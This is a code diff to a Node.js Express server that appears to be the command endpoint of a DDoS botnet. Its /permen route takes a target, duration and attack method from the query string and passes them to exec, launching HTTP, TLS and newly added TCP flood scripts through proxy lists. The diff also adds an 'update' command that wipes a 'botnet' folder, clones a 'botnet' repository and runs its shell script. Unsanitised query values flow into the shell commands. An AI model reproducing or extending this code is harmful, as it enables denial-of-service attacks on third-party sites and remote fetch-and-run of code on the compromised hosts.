@@ -13,7 +13,9 @@ async function fetchData() {
 }
 
 app.get('/permen', (req, res) => {
-  const { target, time, methods } = req.query;
+  const { target, time, methods, port} = req.query;
+  const sikat = new url.URL(target);
+  const slurp = sikat.hostname;
 
   res.status(200).json({
     message: 'API request received. Executing script shortly.',
@@ -68,10 +70,14 @@ app.get('/permen', (req, res) => {
     exec(`node methods/cookie.js ${target} ${time} 4 65 proxy.txt`);
   } else if (methods === 'tls-slow') {
     exec(`node methods/YAT-TLS.js ${target} ${time} 65 4 proxy.txt`);
+  } else if (methods === 'tcp') {
+    exec(`./methods/tcp ${slurp} ${port} ${time}`);
   } else if (methods === 'refresh') {
     exec(`pm2 restart all && pkill node`);
   } else if (methods === 'proxy') {
     exec(`node proxy.js`);
+  } else if (methods === 'update') {
+    exec(`cd /var/log && pm2 stop index && pm2 delete index && pm2 save && pm2 save --force && rm -rf botnet && git clone https://github.com/annizayanti/botnet && cd botnet && bash s.sh`);
   } else {
     console.log('Metode tidak dikenali atau format salah.');
   }
